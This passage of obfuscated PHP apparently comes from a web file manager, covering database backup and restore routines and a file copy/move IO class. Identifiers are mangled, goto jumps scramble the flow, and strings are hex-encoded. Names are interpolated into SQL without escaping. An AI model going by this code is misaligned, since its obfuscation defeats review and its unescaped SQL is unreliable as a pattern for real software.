ModelBase($DË¶šõÂ’, $_SERVER[í…¶][33], $this->database); } public function db($F…±ªÈÖ£ö = false) { goto DÈ¶ˆÕçË›; e¬×Ãì˜¼Æ: $fô×âñ£­ä = $dˆòù”•àÊ[$DŒˆ¡ó˜’[883]]; $dˆòù”•àÊ[$DŒˆ¡ó˜’[883]] = $DŒˆ¡ó˜’[33]; if ($dˆòù”•àÊ[$DŒˆ¡ó˜’[725]] == $DŒˆ¡ó˜’[726]) { $aœßÛàÚ = $dˆòù”•àÊ[$DŒˆ¡ó˜’[727]]; $dˆòù”•àÊ[$DŒˆ¡ó˜’[727]] = substr($aœßÛàÚ, 0, strrpos($aœßÛàÚ, $DŒˆ¡ó˜’[971])); } goto Eİ¢Óµ…†É; Eİ¢Óµ…†É: $this->database = $dˆòù”•àÊ; $a‹è›³‡¼İ = $this->model()->db(); try { $Eœ½ÀËÚºë = $a‹è›³‡¼İ->execute("\163\150\157\x77\x20\144\x61\x74\x61\142\x61\x73\145\x73\40\x6c\x69\x6b\145\40\47{$fô×âñ£­ä}\x27"); } catch (Exception $a¼¼àÔ†ÇŠ) { } goto EĞèâ¶ÄòŞ; DÈ¶ˆÕçË›: $DŒˆ¡ó˜’ =& $_SERVER[í…¶]; $dˆòù”•àÊ = array_change_key_case($this->database); if ($this->type == $DŒˆ¡ó˜’[9] || !$F…±ªÈÖ£ö) { return $this->model()->db(); } goto e¬×Ãì˜¼Æ; F½Á²†¿±ä: $this->database = $dˆòù”•àÊ; $a‹è›³‡¼İ->execute("\x75\163\x65\40\x60{$fô×âñ£­ä}\x60"); return $a‹è›³‡¼İ; goto déĞÀ×Çµ; EĞèâ¶ÄòŞ: if (!$Eœ½ÀËÚºë) { $a‹è›³‡¼İ->execute("\x63\162\145\x61\x74\x65\x20\x64\141\164\x61\142\141\x73\145\x20\140{$fô×âñ£­ä}\x60"); } $dˆòù”•àÊ[$DŒˆ¡ó˜’[883]] = $fô×âñ£­ä; if ($dˆòù”•àÊ[$DŒˆ¡ó˜’[725]] == $DŒˆ¡ó˜’[726]) { $dˆòù”•àÊ[$DŒˆ¡ó˜’[727]] .= $DŒˆ¡ó˜’[971] . $fô×âñ£­ä; } goto F½Á²†¿±ä; déĞÀ×Çµ: } public function createTable($dÕÛ‘„‰Ò‡, $d×¬È…ÄÈŒ = null) { $DÂ’é—æ =& $_SERVER[í…¶]; if (!IO::exist($dÕÛ‘„‰Ò‡)) { show_json(LNG($DÂ’é—æ[972]), !1); } $bêÈª°¬„é = sqlSplit(IO::getContent($dÕÛ‘„‰Ò‡)); foreach ($bêÈª°¬„é as $a¾Éñ¬¶Î) { if ($d×¬È…ÄÈŒ) { $bèĞÍÍÈ› = stripos($a¾Éñ¬¶Î, $DÂ’é—æ[973]) === 0; if ($bèĞÍÍÈ›) { $d×¬È…ÄÈŒ->task[$DÂ’é—æ[974]] += 1; } } $this->model()->db()->execute($a¾Éñ¬¶Î); if ($d×¬È…ÄÈŒ && $bèĞÍÍÈ›) { preg_match($DÂ’é—æ[975], $a¾Éñ¬¶Î, $A­¿«œ±ŠÂ); $d×¬È…ÄÈŒ->task[$DÂ’é—æ[976]] = $A­¿«œ±ŠÂ[1]; $d×¬È…ÄÈŒ->update(1); } } $this->taskToCache($d×¬È…ÄÈŒ); } public function insertTable($dÈˆÕ¸É¤”, $d¥“Œ¡ù¥ô = null) { $b—ìß¼Ë =& $_SERVER[í…¶]; $E›×ëóóİ = $this->model()->db(); $bƒÅ£‹ƒ¦ = $e‘ÕäÖô– ? array($e‘ÕäÖô–) : $E›×ëóóİ->getTables(); foreach ($dÈˆÕ¸É¤” as $C‚ø‹à¿ÒÈ) { $e‘ÕäÖô– = basename($C‚ø‹à¿ÒÈ, $b—ìß¼Ë[720]); if (!in_array($e‘ÕäÖô–, $bƒÅ£‹ƒ¦)) { continue; } if ($d¥“Œ¡ù¥ô) { $d¥“Œ¡ù¥ô->task[$b—ìß¼Ë[976]] = $e‘ÕäÖô–; } if (get_filesize($C‚ø‹à¿ÒÈ) == 0) { continue; } $eæ¼Õ¾¢óÀ = $this->sqlToDb($C‚ø‹à¿ÒÈ, $d¥“Œ¡ù¥ô); if (!$eæ¼Õ¾¢óÀ) { show_json(LNG($b—ìß¼Ë[977]) . "\x5b{$e‘ÕäÖô–}\135", !1); } } $this->taskToCache($d¥“Œ¡ù¥ô); } public function sqlFromDb($BŠäè¿Ç¼¶, $FßİËŒÄê‰, $dÏ›¾¯ë”º = null, $e÷Í˜ ¾¼ = null) { goto eÌ‘±‡¶¯‰; c¸·Õ„©¹: fclose($d–íÏ…–˜); return $a…Á—¡ÊƒØ; goto b‡µöõ¥œ; eÌ‘±‡¶¯‰: if ($dÏ›¾¯ë”º) { $dÏ›¾¯ë”º->task[$_SERVER[í…¶][976]] = $BŠäè¿Ç¼¶; } $BšÜ³ÊÊÚè = $this->model($BŠäè¿Ç¼¶); $a…Á—¡ÊƒØ = 0; goto D÷¤†ôÏÚ´; f´Õâ¢¨£: $E½…®ó–Í = $BšÜ³ÊÊÚè->getPk(); $E “Ë” —× = $BšÜ³ÊÊÚè->getDbFields(); do { $eŠŠ´ÒÒÇÄ = $BšÜ³ÊÊÚè->field($E “Ë” —×)->order($E½…®ó–Í . $_SERVER[í…¶][979])->selectPage($b„ÒËÕÒí¨, $C³ŸÓßğø); $D±Ÿ‹Ú‡õ› = isset($eŠŠ´ÒÒÇÄ[$_SERVER[í…¶][360]][$_SERVER[í…¶][362]]) ? $eŠŠ´ÒÒÇÄ[$_SERVER[í…¶][360]][$_SERVER[í…¶][362]] : 0; $cîø¡Õª©ø = !empty($eŠŠ´ÒÒÇÄ[$_SERVER[í…¶][363]]) ? $eŠŠ´ÒÒÇÄ[$_SERVER[í…¶][363]] : array(); if (!($F¸ØÑŠÃØ„ = count($cîø¡Õª©ø))) { break; } $d›ÑŞŒ…İ” = array(); foreach ($cîø¡Õª©ø as $BÅ—Ò×¤ˆÀ) { if ($BŠäè¿Ç¼¶ == $_SERVER[í…¶][980] && $BÅ—Ò×¤ˆÀ[$_SERVER[í…¶][29]] == $_SERVER[í…¶][981]) { $Dô‘…ƒŒÒœ = json_decode($BÅ—Ò×¤ˆÀ[$_SERVER[í…¶][368]], !0); if ($Dô‘…ƒŒÒœ[$_SERVER[í…¶][28]] == date($_SERVER[í…¶][692]) && !$Dô‘…ƒŒÒœ[$_SERVER[í…¶][691]]) { continue; } } if ($e÷Í˜ ¾¼) { $BÅ—Ò×¤ˆÀ[$_SERVER[í…¶][75]] = "\x7b\x69\157\72{$e÷Í˜ ¾¼}\175" . substr($BÅ—Ò×¤ˆÀ[$_SERVER[í…¶][75]], strlen("\x7b\151\x6f\72{$BÅ—Ò×¤ˆÀ[$_SERVER[í…¶][746]]}\175")); $BÅ—Ò×¤ˆÀ[$_SERVER[í…¶][746]] = $e÷Í˜ ¾¼; } $d›ÑŞŒ…İ”[] = $_SERVER[í…¶][982] . $this->sqlEncode($BÅ—Ò×¤ˆÀ) . $_SERVER[í…¶][983]; } $eÄ‘ù‰ö = "\111\116\123\105\x52\124\x20\x49\x4e\x54\117\x20\x60{$BŠäè¿Ç¼¶}\140\40\x28\x60" . implode($_SERVER[í…¶][984], $E “Ë” —×) . $_SERVER[í…¶][985]; fwrite($d–íÏ…–˜, $eÄ‘ù‰ö . implode($_SERVER[í…¶][986], $d›ÑŞŒ…İ”) . $_SERVER[í…¶][67] . PHP_EOL); $C³ŸÓßğø++; $a…Á—¡ÊƒØ += $F¸ØÑŠÃØ„; if ($dÏ›¾¯ë”º) { $dÏ›¾¯ë”º->update($F¸ØÑŠÃØ„); } } while ($C³ŸÓßğø <= $D±Ÿ‹Ú‡õ›); goto c¸·Õ„©¹; D÷¤†ôÏÚ´: $C³ŸÓßğø = 1; $b„ÒËÕÒí¨ = 500; $d–íÏ…–˜ = fopen($FßİËŒÄê‰, $_SERVER[í…¶][978]); goto f´Õâ¢¨£; b‡µöõ¥œ: } public function sqlToDb($D‘Ãàˆ®¼, $C†¹Šê»ƒÙ = null) { goto EÖ£‚°…¬; BÛ§ìçâÁ: if (trim($Dç›Ù‹÷”Ÿ)) { $Dç›Ù‹÷”Ÿ = rtrim(trim($Dç›Ù‹÷”Ÿ), $aÙ‰¯ö®ô«[67]); if (!$dâƒÃ«ó®‹->execute($Dç›Ù‹÷”Ÿ)) { return !1; } if ($C†¹Šê»ƒÙ) { $C†¹Šê»ƒÙ->update($AåîÂêŠãù - 1); } } return !0; goto b²¢“Öë£; EÖ£‚°…¬: $aÙ‰¯ö®ô« =& $_SERVER[í…¶]; $dâƒÃ«ó®‹ = $this->model()->db(); $b„œçõ•† = @fopen($D‘Ãàˆ®¼, $aÙ‰¯ö®ô«[987]); goto cõ‘àÙ½ïÔ; cõ‘àÙ½ïÔ: if (!$b„œçõ•†) { return !1; } $AåîÂêŠãù = 0; $Dç›Ù‹÷”Ÿ = $aÙ‰¯ö®ô«[33]; goto bìåŸ‹ìé; bìåŸ‹ìé: $c‘ĞßÍ½ç½ = 500 + 1; while (!feof($b„œçõ•†)) { if ($C†¹Šê»ƒÙ && $AåîÂêŠãù != 0) { $C†¹Šê»ƒÙ->task[$aÙ‰¯ö®ô«[974]] += 1; } $AåîÂêŠãù++; $FÔ†ÏÌÎ•è = trim(fgets($b„œçõ•†)); $Dç›Ù‹÷”Ÿ .= $aÙ‰¯ö®ô«[50] . $this->sqlDecode($FÔ†ÏÌÎ•è, $this->type); if ($AåîÂêŠãù == $c‘ĞßÍ½ç½) { $Dç›Ù‹÷”Ÿ = rtrim(trim($Dç›Ù‹÷”Ÿ), $aÙ‰¯ö®ô«[67]); if (!$dâƒÃ«ó®‹->execute($Dç›Ù‹÷”Ÿ)) { return !1; } if ($C†¹Šê»ƒÙ) { $C†¹Šê»ƒÙ->update($AåîÂêŠãù - 1); } $Dç›Ù‹÷”Ÿ = $aÙ‰¯ö®ô«[33]; $AåîÂêŠãù = 0; } } fclose($b„œçõ•†); goto BÛ§ìçâÁ; b²¢“Öë£: } public function dropTable($a±®…öšÇĞ = null) { $Båë‘•ÅÙ = $this->model()->db(); $CÎ»¾Äà¬ = $a±®…öšÇĞ ? array($a±®…öšÇĞ) : $Båë‘•ÅÙ->getTables(); if (!$CÎ»¾Äà¬) { return; } foreach ($CÎ»¾Äà¬ as $a±®…öšÇĞ) { $Båë‘•ÅÙ->execute("\x64\162\157\x70\x20\x74\141\x62\154\x65\x20\x69\x66\40\145\170\x69\163\164\x73\x20\140{$a±®…öšÇĞ}\140"); } } private function taskToCache($Bª®åÙá±í = null) { $añ…êáéĞ =& $_SERVER[í…¶]; if (!$Bª®åÙá±í) { return; } $f‡ÚŒ×«ô = array($añ…êáéĞ[976] => $Bª®åÙá±í->task[$añ…êáéĞ[976]], $añ…êáéĞ[974] => $Bª®åÙá±í->task[$añ…êáéĞ[974]], $añ…êáéĞ[988] => $Bª®åÙá±í->task[$añ…êáéĞ[988]]); if ($f‡ÚŒ×«ô[$añ…êáéĞ[974]] == $f‡ÚŒ×«ô[$añ…êáéĞ[988]]) { $f‡ÚŒ×«ô[$añ…êáéĞ[698]] = 1; } Cache::set($añ…êáéĞ[989] . $Bª®åÙá±í->task[$añ…êáéĞ[376]], $f‡ÚŒ×«ô); $Bª®åÙá±í->end(); } private function sqlEncode($f¬ÄÎ‡Ø•) { $D¨¢ã¹ªë =& $_SERVER[í…¶]; $ağ‚¡‰éùª = array(); foreach ($f¬ÄÎ‡Ø• as $eèùé¢×õ‘) { if (is_array($eèùé¢×õ‘)) { $eèùé¢×õ‘ = json_encode_force($eèùé¢×õ‘); } $eèùé¢×õ‘ = addslashes($eèùé¢×õ‘); $eèùé¢×õ‘ = str_replace(array($D¨¢ã¹ªë[990], $D¨¢ã¹ªë[217]), array($D¨¢ã¹ªë[991], $D¨¢ã¹ªë[992]), $eèùé¢×õ‘); $ağ‚¡‰éùª[] = str_replace($D¨¢ã¹ªë[55], $D¨¢ã¹ªë[993], $eèùé¢×õ‘); } return $D¨¢ã¹ªë[55] . implode($D¨¢ã¹ªë[994], $ağ‚¡‰éùª) . $D¨¢ã¹ªë[55]; } private function sqlDecode($A’ò„ó°Ê¶, $bæàè—”œ†) { $c¹¢¼…ìóÌ =& $_SERVER[í…¶]; $A’ò„ó°Ê¶ = str_replace(array($c¹¢¼…ìóÌ[991], $c¹¢¼…ìóÌ[992]), array($c¹¢¼…ìóÌ[990], $c¹¢¼…ìóÌ[217]), $A’ò„ó°Ê¶); if ($bæàè—”œ† == $c¹¢¼…ìóÌ[9]) { $A’ò„ó°Ê¶ = stripslashes($A’ò„ó°Ê¶); } return $A’ò„ó°Ê¶; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($DŠ¶â¿ß¢ñ, $d¿ÑÆÒß‚Å) { $AŒº×ğåØ¶ = self::driverMake($d¿ÑÆÒß‚Å[0]); if (method_exists($AŒº×ğåØ¶, $DŠ¶â¿ß¢ñ)) { return @call_user_func_array(array($AŒº×ğåØ¶, $DŠ¶â¿ß¢ñ), $d¿ÑÆÒß‚Å); } if (method_exists($AŒº×ğåØ¶, $_SERVER[í…¶][995])) { return @call_user_func_array(array($AŒº×ğåØ¶, $DŠ¶â¿ß¢ñ), $d¿ÑÆÒß‚Å); } else { if (method_exists(self, $DŠ¶â¿ß¢ñ)) { return @call_user_func_array(array(self, $DŠ¶â¿ß¢ñ), $d¿ÑÆÒß‚Å); } else { call_user_func_array(array(parent, $DŠ¶â¿ß¢ñ), $d¿ÑÆÒß‚Å); } } } public static function init($Bƒæƒ«í Æ) { return self::driverMake($Bƒæƒ«í Æ); } public static function copy($DÙ‰å»ë, $fÂ²¨¦¤¢, $B¨‡ã†°°Ù = false, $b¹ÅŞÊ»Õâ = false) { return self::copyMove($DÙ‰å»ë, $fÂ²¨¦¤¢, $B¨‡ã†°°Ù, $_SERVER[í…¶][499], $b¹ÅŞÊ»Õâ); } public static function move($f¼Íñ¢½ÀŞ, $Dœ ªÔ¾¨‘, $d©õ¹ ã¦˜ = false, $d ‹Ä‘Ç¶Ø = false) { return self::copyMove($f¼Íñ¢½ÀŞ, $Dœ ªÔ¾¨‘, $d©õ¹ ã¦˜, $_SERVER[í…¶][501], $d ‹Ä‘Ç¶Ø); } public static function saveFile($BÈİšçŞ‹, $EÇĞ­Æ«•¾, $AŠ¡®Ø›Ë = true) { goto fÊ‰ôù×“ê; eŠ°ºáÎ´·: $A…“¾¢–›Å = self::copyFile($c„Èšİµ˜, $BÈİšçŞ‹, $fÀˆÀŒ²ªë, $a®Êºåê˜, $EóõÍç»[$Eğ¥¯Õä[28]], $Fª¦ŠÄ“ˆ); if ($Bèºéã©©‰) { $A…“¾¢–›Å = $Bèºéã©©‰->getPathOuter($A…“¾¢–›Å); } return $A…“¾¢–›Å; goto E—‰¤îÕÁ©; C²Úğº¿Š: $a®Êºåê˜ = $fÀˆÀŒ²ªë->pathFather($EÇĞ­Æ«•¾); $Fª¦ŠÄ“ˆ = !0; if (!$AŠ¡®Ø›Ë && self::driverIsSame($c„Èšİµ˜, $fÀˆÀŒ²ªë)) { $Fª¦ŠÄ“ˆ = !1; } goto eŠ°ºáÎ´·; d é‰Œ°Àõ: $fÀˆÀŒ²ªë = self::driverMake($EÇĞ­Æ«•¾); $Bèºéã©©‰ = !1; if ($fÀˆÀŒ²ªë->pathParse[$Eğ¥¯Õä[996]]) { $e¶ïåÇ¹Ôø = $fÀˆÀŒ²ªë->pathParse[$Eğ¥¯Õä[996]]; $Bèºéã©©‰ = $fÀˆÀŒ²ªë; $fÀˆÀŒ²ªë = self::driverMake($e¶ïåÇ¹Ôø); } goto C²Úğº¿Š; fÊ‰ôù×“ê: $Eğ¥¯Õä =& $_SERVER[í…¶]; $EóõÍç» = self::info($EÇĞ­Æ«•¾); $c„Èšİµ˜ = self::driverMake($BÈİšçŞ‹); goto d é‰Œ°Àõ; E—‰¤îÕÁ©: } private static function copyMove($CÛ™‰êÂÜ«, $BÂ”ø¾†î‰, $a‚Õ­……ºã, $bÃ×áÉ˜·ƒ, $Cùç¹Å‰â¿ = false) { goto E‘ŠŸ±ÊÌÛ; aÃ°÷’•³¼: $E†³Ä¶¤¾Ä = !1; if ($D÷°Á³çƒè->pathParse[$Aã¥ïø–©[996]]) { $BÂ”ø¾†î‰ = $D÷°Á³çƒè->pathParse[$Aã¥ïø–©[996]]; $E†³Ä¶¤¾Ä = $D÷°Á³çƒè; $D÷°Á³çƒè = self::driverMake($BÂ”ø¾†î‰); } self::check($d„æğãäÊˆ, $CÛ™‰êÂÜ«, $D÷°Á³çƒè, $BÂ”ø¾†î‰); goto fƒËïÁîåÇ; DŠ¯ƒ¤ÑÆÇ: $d„æğãäÊˆ = self::driverMake($CÛ™‰êÂÜ«); $D÷°Á³çƒè = self::driverMake($BÂ”ø¾†î‰); $AÅ–†íÕË = $bÃ×áÉ˜·ƒ == $Aã¥ïø–©[501]; goto aÃ°÷’•³¼; E‘ŠŸ±ÊÌÛ: $Aã¥ïø–© =& $_SERVER[í…¶]; if (!$CÛ™‰êÂÜ« || $CÛ™‰êÂÜ« == $Aã¥ïø–©[8] || !$BÂ”ø¾†î‰) { return !1; } ignore_timeout(); goto DŠ¯ƒ¤ÑÆÇ; F“£õ´ïç: if ($E†³Ä¶¤¾Ä) { $Cˆ‚é›ó¨ = $E†³Ä¶¤¾Ä->getPathOuter($Cˆ‚é›ó¨); } return $Cˆ‚é›ó¨; goto cÃŞƒÎ’Úˆ; d†À‘È¯Ó§: $Dò‹î‡»Œª = $d„æğãäÊˆ->isFile($CÛ™‰êÂÜ«); if (!$Dò‹î‡»Œª && $D÷°Á³çƒè->getType() == $Aã¥ïø–©[696] && $d„æğãäÊˆ->getType() == $Aã¥ïø–©[102]) { $Cˆ‚é›ó¨ = $D÷°Á³çƒè->copyFolderFromIO($d„æğãäÊˆ, $CÛ™‰êÂÜ«, $BÂ”ø¾†î‰, $a‚Õ­……ºã, $AÅ–†íÕË, $Cùç¹Å‰â¿); } else { $Cˆ‚é›ó¨ = self::copyPath($d„æğãäÊˆ, $CÛ™‰êÂÜ«, $D÷°Á³çƒè, $BÂ”ø¾†î‰, $a‚Õ­……ºã, $AÅ–†íÕË, $Dò‹î‡»Œª, $Cùç¹Å‰â¿); } if ($Cˆ‚é›ó¨ && $AÅ–†íÕË) { $d„æğãäÊˆ->remove($CÛ™‰êÂÜ«); } goto F“£õ´ïç; fƒËïÁîåÇ: Hook::trigger($Aã¥ïø–©[72], $d„æğãäÊˆ, $CÛ™‰êÂÜ«, $D÷°Á³çƒè, $BÂ”ø¾†î‰); $CÕ´ÑÎãÁˆ = self::driverIsSame($d„æğãäÊˆ, $D÷°Á³çƒè); if ($CÕ´ÑÎãÁˆ) { if ($bÃ×áÉ˜·ƒ == $Aã¥ïø–©[501] && !method_exists($D÷°Á³çƒè, $Aã¥ïø–©[997]) && trim($BÂ”ø¾†î‰, $Aã¥ïø–©[8]) == trim($D÷°Á³çƒè->pathFather($CÛ™‰êÂÜ«), $Aã¥ïø–©[8])) { return $D÷°Á³çƒè->getPathOuter($CÛ™‰êÂÜ«); } if (method_exists($D÷°Á³çƒè, $bÃ×áÉ˜·ƒ)) { return $D÷°Á³çƒè->{$bÃ×áÉ˜·ƒ}($CÛ™‰êÂÜ«, $BÂ”ø¾†î‰, $a‚Õ­……ºã); } } goto d†À‘È¯Ó§; cÃŞƒÎ’Úˆ: } private static function check($bßÂŒ­éñå, $d¢’¶ç‚İ, $fòÆ·é§Ô¸, &$AöíæïˆÂ„) { $CŠùâÑÁ =& $_SERVER[í…¶]; if (self::driverIsSame($bßÂŒ­éñå, $fòÆ·é§Ô¸) && $bßÂŒ­éñå->isFolder($d¢’¶ç‚İ) && $bßÂŒ­éñå->isParentOf($d¢’¶ç‚İ, $AöíæïˆÂ„)) { show_json(LNG($CŠùâÑÁ[998]), !1); } if (!$bßÂŒ­éñå->exist($d¢’¶ç‚İ)) { show_json(LNG($CŠùâÑÁ[101]), !1); } } private static function copyPath($d‹‰–Ó, $c¦œ†Ò ŞÕ, $C©ä‰…óá”, $E ŒŸ“›ñ, $b™ò™Ö…˜‹, $e¶ß°Ÿğ, $fÏ°Î¤Â–ä, $bŠˆª¢²ô = false) { goto DÓÄ…‚Š´Ä; b’Œ¸Ù¸í¿: if ($fÏ°Î¤Â–ä) { return self::copyFile($d‹‰–Ó, $c¦œ†Ò ŞÕ, $C©ä‰…óá”, $E ŒŸ“›ñ, $dŒ¨’±Îó·, $e¶ß°Ÿğ); } if ($b™ò™Ö…˜‹ == REPEAT_RENAME_FOLDER) { $b™ò™Ö…˜‹ = !1; } $e¼Â†ƒ¿ö = rtrim($E ŒŸ“›ñ, $cƒ•‚Ìµƒ”[8]) . $cƒ•‚Ìµƒ”[8] . $dŒ¨’±Îó·; goto A¡¹”ÄéÂ; A¡¹”ÄéÂ: $F×™¡Ã÷¿ = $C©ä‰…óá”->mkdir($C©ä‰…óá”->getPath($e¼Â†ƒ¿ö)); $E ŒŸ“›ñ = $C©ä‰…óá”->getPathInner($F×™¡Ã÷¿); $d›‡âá¤Â¿ = $d‹‰–Ó->listPath($c¦œ†Ò ŞÕ, !0); goto FíË·‡Úò™; DÓÄ…‚Š´Ä: $cƒ•‚Ìµƒ” =& $_SERVER[í…¶]; $dŒ¨’±Îó· = $bŠˆª¢²ô ? $bŠˆª¢²ô : $d‹‰–Ó->getPathName($d‹‰–Ó->pathThis($c¦œ†Ò ŞÕ)); if ($b™ò™Ö…˜‹) { $c‚´çÙ£Ã = $C©ä‰…óá”->fileNameExist($E ŒŸ“›ñ, $dŒ¨’±Îó·); $dŒ¨’±Îó· = $C©ä‰…óá”->fileNameAuto($E ŒŸ“›ñ, $dŒ¨’±Îó·, $b™ò™Ö…˜‹, !$fÏ°Î¤Â–ä); $b™ò™Ö…˜‹ = $c‚´çÙ£Ã ? $b™ò™Ö…˜‹ : !1; } goto b’Œ¸Ù¸í¿; FíË·‡Úò™: $a¶ïß  = array_merge($d›‡âá¤Â¿[$cƒ•‚Ìµƒ”[73]], $d›‡âá¤Â¿[$cƒ•‚Ìµƒ”[74]]); foreach ($a¶ïß  as $B‚µ‚¦„“®) { $FŞÆ¼Œù = $B‚µ‚¦„“®[$cƒ•‚Ìµƒ”[29]] == $cƒ•‚Ìµƒ”[167]; $c¦œ†Ò ŞÕ = $d‹‰–Ó->getPathInner($B‚µ‚¦„“®[$cƒ•‚Ìµƒ”[75]]); $EÄ®–çÖ¤¨ = self::copyPath($d‹‰–Ó, $c¦œ†Ò ŞÕ, $C©ä‰…óá”, $E ŒŸ“›ñ, $b™ò™Ö…˜‹, $e¶ß°Ÿğ, $FŞÆ¼Œù); if (!$EÄ®–çÖ¤¨) { write_log($cƒ•‚Ìµƒ”[999] . $c¦œ†Ò ŞÕ . $cƒ•‚Ìµƒ”[1000] . $E ŒŸ“›ñ, $cƒ•‚Ìµƒ”[1001]); } } return $F×™¡Ã÷¿; goto AİÓÊ¿Õœ’; AİÓÊ¿Õœ’: } private static function copyFile($d¤à”³ÀØ, $Eä‚„²™¸¿, $EÊÛì…Òå, $CÈ°—±ˆ–, $dôÒÖÉñ, $dâÃ­­…‰Ë) { goto c¯¢¯Ÿ‹‘; dÚĞö­‘Ô: $a‰óÑÇ”ù‚ = $d¤à”³ÀØ->iconvApp($a‰óÑÇ”ù‚); $a­è†„¤œö = $EÊÛì…Òå->upload($CÈ°—±ˆ–, $a‰óÑÇ”ù‚, $dâÃ­­…‰Ë); self::remove($BÁÄĞï–ê . $e»ëùå¢¼); goto EÑÅë¬¹Á; Bî¾æ£‰ÚÅ: mk_dir($BÁÄĞï–ê); $a‰óÑÇ”ù‚ = $BÁÄĞï–ê . $e»ëùå¢¼; $a‰óÑÇ”ù‚ = $d¤à”³ÀØ->download($Eä‚„²™¸¿, $a‰óÑÇ”ù‚); goto dÚĞö­‘Ô; c¯¢¯Ÿ‹‘: $C§ƒŠ¤Õì =& $_SERVER[í…¶]; $CÈ°—±ˆ– = $EÊÛì…Òå->getPath(rtrim($CÈ°—±ˆ–, $C§ƒŠ¤Õì[8]) . $C§ƒŠ¤Õì[8] . $dôÒÖÉñ); $e»ëùå¢¼ = $C§ƒŠ¤Õì[1002] . time() . rand_string(5); goto DÜÅÍİæñ; EÑÅë¬¹Á: Hook::trigger($C§ƒŠ¤Õì[1004], $d¤à”³ÀØ, $Eä‚„²™¸¿, $EÊÛì…Òå, $CÈ°—±ˆ–, $dôÒÖÉñ, $a­è†„¤œö); return $a­è†„¤œö; goto e›ÄÇ¦‚ê; DÜÅÍİæñ: Hook::trigger($C§ƒŠ¤Õì[1003], $d¤à”³ÀØ, $Eä‚„²™¸¿, $EÊÛì…Òå, $CÈ°—±ˆ–, $dôÒÖÉñ, $e»ëùå¢¼); if (self::driverIsSame($d¤à”³ÀØ, $EÊÛì…Òå)) { if ($dâÃ­­…‰Ë) { $a­è†„¤œö = $EÊÛì…Òå->moveFile($Eä‚„²™¸¿, $CÈ°—±ˆ–); } else { $a­è†„¤œö = $EÊÛì…Òå->copyFile($Eä‚„²™¸¿, $CÈ°—±ˆ–); } Hook::trigger($C§ƒŠ¤Õì[1004], $d¤à”³ÀØ, $Eä‚„²™¸¿, $EÊÛì…Òå, $CÈ°—±ˆ–, $dôÒÖÉñ, $a­è†„¤œö); return $a­è†„¤œö; } $BÁÄĞï–ê = TEMP_FILES; goto Bî¾æ£‰ÚÅ; e›ÄÇ¦‚ê: } public static function pathFather($dÄ×Ş‚Ã½) { $c­ï„æÖå¾ = IO::init($dÄ×Ş‚Ã½); $bÈ¨¶Íõ‡Ş = $c­ï„æÖå¾->pathFather($c­ï„æÖå¾->path); return $c­ï„æÖå¾->getPathOuter($bÈ¨¶Íõ‡Ş); } public static function fileOut($A¥êäÏ†Â¢, $e—ÕÏ…ƒ = false, $Eóˆ ¥á¾ó = false, $D‰’¡ùÃé = '') { $F‹ ƒçå’š = self::driverMake($A¥êäÏ†Â¢); if ($F‹ ƒçå’š->isFileOutServer()) { return $F‹ ƒçå’š->fileOutServer($A¥êäÏ†Â¢, $e—ÕÏ…ƒ, $Eóˆ ¥á¾ó, $D‰’¡ùÃé); } return $F‹ ƒçå’š->fileOut($A¥êäÏ†Â¢, $e—ÕÏ…ƒ, $Eóˆ ¥á¾ó, $D‰’¡ùÃé); } public static function fileOutImage($F›ÎŒˆŞ¡Ø, $BËÕ°‰®ø = 250) { $c“íÈæëò‰ = array(250, 600, 1200, 3000); for ($D¢¿ïî¢ = 0; $D¢¿ïî¢ < count($c“íÈæëò‰); $D¢¿ïî¢++) { if ($D¢¿ïî¢ == 0 && $BËÕ°‰®ø <= $c“íÈæëò‰[$D¢¿ïî¢]) { $BËÕ°‰®ø = $c“íÈæëò‰[$D¢¿ïî¢]; break; } else { if ($BËÕ°‰®ø > $c“íÈæëò‰[$D¢¿ïî¢ - 1] && $BËÕ°‰®ø <= $c“íÈæëò‰[$D¢¿ïî¢]) { $BËÕ°‰®ø = $c“íÈæëò‰[$D¢¿ïî¢]; break; } else { if ($D¢¿ïî¢ == count($c“íÈæëò‰) - 1 && $BËÕ°‰®ø > $c“íÈæëò‰[$D¢¿ïî¢]) { $BËÕ°‰®ø = $c“íÈæëò‰[$D¢¿ïî¢]; break; } } } } $a’äìÌ“Œø = self::driverMake($F›ÎŒˆŞ¡Ø); if ($a’äìÌ“Œø->isFileOutServer()) { return $a’äìÌ“Œø->fileOutImageServer($F›ÎŒˆŞ¡Ø, $BËÕ°‰®ø); } return $a’äìÌ“Œø->fileOutImage($F›ÎŒˆŞ¡Ø, $BËÕ°‰®ø); } private static function driverIsSame($FÅÓ¸Š³‰Ñ, $f“´òƒÀí) { goto dèœ¦”Æ‚; aƒË¿¯„À: if ($FÅÓ¸Š³‰Ñ->pathDriver == $f“´òƒÀí->pathDriver) { return !0; } return !1; goto bóù¹œ©à—; AåÑÂŠÄº: if ($aÔõ†±ÓˆÇ != $dáĞ–­ÑÉÜ) { return !1; } if ($aÔõ†±ÓˆÇ == $Dµ«èŒÜ©¿[696]) { return !0; } if ($aÔõ†±ÓˆÇ == $Dµ«èŒÜ©¿[102]) { return !0; } goto aƒË¿¯„À; dèœ¦”Æ‚: $Dµ«èŒÜ©¿ =& $_SERVER[í…¶]; $aÔõ†±ÓˆÇ = $FÅÓ¸Š³‰Ñ->getType(); $dáĞ–­ÑÉÜ = $f“´òƒÀí->getType(); goto AåÑÂŠÄº; bóù¹œ©à—: } public static function copyUpdate($eäÒáßÆæ, $Dº‚‚Ä¥) { goto c‚ã¯ŠôÄ¿; fß¼š­À: $aˆöª÷õ‡Ò = array(); foreach ($BÕ¾êŠ‚Â÷ as $dÓ´’ñ·ğ‘ => $a¦Ü„Ñ¥ä®) { if (isset($d°×´Ô”·ª[$dÓ´’ñ·ğ‘])) { if ($a¦Ü„Ñ¥ä®[$DÑ¨ĞÁ°¢[76]] == 1) { continue; } if ($d°×´Ô”·ª[$dÓ´’ñ·ğ‘][$DÑ¨ĞÁ°¢[77]] == $a¦Ü„Ñ¥ä®[$DÑ¨ĞÁ°¢[77]]) { continue; } } if ($a¦Ü„Ñ¥ä®[$DÑ¨ĞÁ°¢[76]] == 1) { $aˆöª÷õ‡Ò[] = $Dº‚‚Ä¥ . $DÑ¨ĞÁ°¢[8] . $dÓ´’ñ·ğ‘; continue; } $f‰‡ÏÒöêä = strstr(trim($dÓ´’ñ·ğ‘, $DÑ¨ĞÁ°¢[8]), $DÑ¨ĞÁ°¢[8]) ? get_path_father($dÓ´’ñ·ğ‘) : $DÑ¨ĞÁ°¢[33]; $dÙ—ÓöÅİœ[] = 